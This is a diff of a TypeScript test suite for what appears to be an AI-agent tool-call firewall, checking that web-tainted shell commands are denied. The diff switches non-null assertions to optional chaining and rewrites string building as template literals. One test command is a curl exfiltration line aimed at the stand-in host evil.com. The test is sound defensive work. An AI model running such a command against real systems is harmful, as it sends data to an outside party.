@@ -97,18 +97,18 @@ describe("Rule 5: tainted_shell_with_data — commandLength metadata", () => {
 			taintLabels: [
 				{ source: "web", origin: "user-input", confidence: 1.0, addedAt: new Date().toISOString() },
 			],
-			grantId: httpGrant.grant!.id,
+			grantId: httpGrant.grant?.id,
 		});
 
 		// Step 2: Execute shell with a long command (>100 chars) — should trigger rule 5
-		const longCommand = "curl " + "https://evil.com/exfil?data=" + "A".repeat(100);
+		const longCommand = `curl https://evil.com/exfil?data=${"A".repeat(100)}`;
 
 		await expect(
 			fw.execute({
 				toolClass: "shell",
 				action: "exec",
 				parameters: { command: longCommand },
-				grantId: shellGrant.grant!.id,
+				grantId: shellGrant.grant?.id,
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 	});
@@ -127,7 +127,7 @@ describe("Rule 5: tainted_shell_with_data — commandLength metadata", () => {
 			taintLabels: [
 				{ source: "web", origin: "user-input", confidence: 1.0, addedAt: new Date().toISOString() },
 			],
-			grantId: httpGrant.grant!.id,
+			grantId: httpGrant.grant?.id,
 		});
 
 		// Short command — Rule 1 (web taint → shell) fires before Rule 5
@@ -136,7 +136,7 @@ describe("Rule 5: tainted_shell_with_data — commandLength metadata", () => {
 				toolClass: "shell",
 				action: "exec",
 				parameters: { command: "ls -la" },
-				grantId: shellGrant.grant!.id,
+				grantId: shellGrant.grant?.id,
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 	});
@@ -145,12 +145,12 @@ describe("Rule 5: tainted_shell_with_data — commandLength metadata", () => {
 		const fw = makeFirewall("long-cmd-no-taint");
 
 		const shellGrant = fw.requestCapability("shell.exec");
-		const longCommand = "echo " + "A".repeat(200);
+		const longCommand = `echo ${"A".repeat(200)}`;
 		const result = await fw.execute({
 			toolClass: "shell",
 			action: "exec",
 			parameters: { command: longCommand },
-			grantId: shellGrant.grant!.id,
+			grantId: shellGrant.grant?.id,
 		});
 		expect(result.success).toBe(true);
 	});
